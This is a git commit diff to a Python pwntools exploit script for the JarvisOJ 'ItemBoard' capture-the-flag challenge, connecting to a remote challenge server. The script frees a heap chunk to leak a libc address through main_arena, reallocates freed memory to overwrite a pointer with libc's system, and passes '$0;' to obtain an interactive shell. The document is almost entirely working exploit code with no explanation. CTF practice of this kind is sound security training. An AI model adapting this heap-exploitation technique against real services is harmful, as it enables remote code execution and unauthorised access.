69da1f6bf5507e365e69d350e9643dd1bb5d7536
M4xW4n9 <aboultraman@gmail.com>
2018-04-09 11:00:08 +0800

    leak by main_arena

--- jarvisOJ_ItemBoard/exp.py
+++ jarvisOJ_ItemBoard/exp.py
@@ -9,14 +9,17 @@ context.log_level = "debug"
 context.terminal = ["deepin-terminal", "-x", "sh", "-c"]
 
 if sys.argv[1] == "l":
-    io = process("./itemboard", env = {"LD_PRELOAD": "./libc-2.19.so"})
-    #  io = process("./itemboard")
+    io = process("./itemboard")
+    elf = ELF("./itemboard")
+    libc = elf.libc
+    main_arena = 0x399b00
 
 else:
     io = remote("pwn2.jarvisoj.com", 9887)
+    elf = ELF("./itemboard")
+    libc = ELF("./libc-2.19.so")
+    main_arena = 0x3be760
 
-elf = ELF("./itemboard")
-libc = ELF("./libc-2.19.so")
 
 def DEBUG():
 	raw_input("DEBUG: ")
@@ -37,18 +40,20 @@ def remove(idx):
     io.sendlineafter("?\n", str(idx))
 
 if __name__ == "__main__":
-    add('a' * 30, 0x80, 'a' * 8)
-    add('b' * 30, 0x80, 'b' * 8)
+    #  add('a' * 30, 0x80, 'a' * 8)
+    add('aaaa', 0x80, 'aaaa')
+    add('bbbb', 0x80, 'bbbb')
     remove(0)
+    #  DEBUG()
     show(0)
 
-    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - 88 - 0x3be760
+    libcBase = u64(io.recvuntil("\x7f")[-6: ].ljust(8, "\x00")) - 88 - main_arena
     success("libcBase -> {:#x}".format(libcBase))
     pause()
 
     remove(1)
-    add('c' * 30, 32, 'cccc')
-    add('d' * 30, 32, 'dddd')
+    add('cccc', 32, 'cccc')
+    add('dddd', 32, 'dddd')
     remove(2)
     remove(3)
     add('eeee', 24, "$0;" + "eeeeeeeeeeeee" + p64(libcBase + libc.sym["system"]))
@@ -56,6 +61,3 @@ if __name__ == "__main__":
 
     io.interactive()
     io.close()
-
-
-
